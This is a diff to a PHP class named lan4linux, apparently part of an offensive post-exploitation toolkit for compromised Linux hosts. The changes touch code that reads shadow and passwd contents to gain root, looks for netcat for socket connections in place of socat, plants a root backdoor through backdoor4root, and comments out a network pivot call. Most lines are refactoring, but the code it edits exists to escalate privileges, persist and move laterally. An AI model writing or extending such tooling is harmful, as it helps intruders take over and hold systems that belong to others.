@@ -37,6 +37,8 @@ class lan4linux extends LAN{
     
     var $etc_passwd_str ;
     var $shell_version ;
+    
+    var $path_remotebin_socat;
 
 
     public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_shell,$id8b64) {
@@ -134,7 +136,7 @@ class lan4linux extends LAN{
         exec("echo '$tmp' | grep ':'   ",$tab_tmp);
         $shadow_str = $this->tab($tab_tmp);
         if ( (!empty($shadow_str)) && (strstr($shadow_str, "root:")) ){
-            $this->lan2root8shadow($shadow_str,$this->etc_passwd_str);
+            $this->root8shadow($shadow_str,$this->etc_passwd_str);
         }
         
     }
@@ -166,6 +168,10 @@ class lan4linux extends LAN{
         
         
     }
+    
+    
+
+
     
     
     public function lan2init2app8executable(){
@@ -219,10 +225,7 @@ class lan4linux extends LAN{
     
     public function lan2init2app8socket(){
         $this->ssTitre(__FUNCTION__);
-        
-        $filename = "socat";
-        $path_gcc = $this->lan2file4locate($filename);
-        if (!empty($path_gcc)) return trim($path_gcc);
+
         
         $filename = "nc";
         $path_gcc = $this->lan2file4locate($filename);
@@ -338,7 +341,7 @@ class lan4linux extends LAN{
         
         $this->backdoor4root($this->stream);
         
-        $this->lan2pivot($this->stream);
+        //$this->lan2pivot($this->stream);
         
         return $result;
         
